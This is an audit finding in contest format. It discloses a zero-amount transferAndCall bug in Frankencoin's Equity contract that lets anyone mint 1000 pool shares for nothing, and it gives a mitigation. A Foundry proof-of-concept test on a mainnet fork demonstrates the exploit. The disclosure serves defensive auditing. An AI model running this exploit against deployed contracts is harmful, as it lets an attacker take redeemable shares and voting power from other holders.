  # Lines of code

https://github.com/code-423n4/2023-04-frankencoin/blob/main/contracts/Equity.sol#L241


# Vulnerability details

## Impact
## Brief /Intro
A malicious user can call the transferAndCall function, passing in zero as the amount to mint at least 1000 FrankenCoin shares. These shares can be used to influence voting or redeemed for actual Zchf tokens.

## Explanation
Frankencoin::transferAndCall and Equity::onTokenTransfer dont have a zero amount check. The only check for the function resides in the inherited ERC20:_transfer function which checks that the recipient is not a zero address.

Because of the above, anyone can transfer zero through transferAndCall to the reserve triggering onTokenTransfer in Equity.sol transferring the 1000 shares to the user.

The caveat is that Frankencoin::equity has to return >= 1000

## Impact
An attacker can mint FPS tokens for themselves without providing any actual value or investment into the system. FPS tokens are crucial for the system because they can be redeemed for Frankencoins or affect the voting

## Proof of Concept
```
contract TokenTest is Test {

Frankencoin zchf;
MintingHub mintingHub;
PositionFactory factory;
StablecoinBridge bridge;
Equity reserve;

uint limit = 1_000_000 ether;

IERC20 collateral = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

function setUp() public {
    zchf = new Frankencoin(7 days);
    reserve = Equity(address(zchf.reserve()));
    factory = new PositionFactory();
    mintingHub = new MintingHub(address(zchf), address(factory));
    bridge = new StablecoinBridge(address(collateral), address(zchf), limit);
}

function testAnotherTransferAndCall() public {
    zchf.suggestMinter(address(bridge), 0, 0, "");
    zchf.suggestMinter(address(mintingHub), 0, 0, "");

    //Open A position for minting
    deal(address(collateral), address(this), 1000 ether);
    deal(address(zchf), address(this), 1000 ether);
    collateral.approve(address(mintingHub), 1000 ether);
    zchf.approve(address(mintingHub), 1000 ether);
    address pos = mintingHub.openPosition(address(collateral), 5 ether, 1000 ether, 1_000_000 ether, 259200, 31536000, 86400, 30000, 1_600 ether , 200000);
    console.log("New position opened with the address: ", pos);

    address[] memory users = new address[](5);
    for(uint i; i < 5; i++) {
        users[i] = address(uint160(i + 1));
        deal(address(collateral), users[i], 1000 ether);
        vm.startPrank(users[i]);
        collateral.approve(address(bridge), 1000 ether);
        bridge.mint(1000 ether);
        vm.stopPrank();
    }

    emit log_named_uint("Equity Value is ", zchf.equity()/1e18);

    zchf.transferAndCall(address(reserve), 0, "");
    console.log("My FrankenCoin Pool Share balance is ", reserve.balanceOf(address(this))/1e18);
}
}
```

## Tools Used
This test was developed in a foundry environment and the test ran on a fork of the mainnet.

## Recommended Mitigation Steps
frankencoin::transferAndCall or equity::onTokenTransfer should have a 0 amount check to prevent this attack
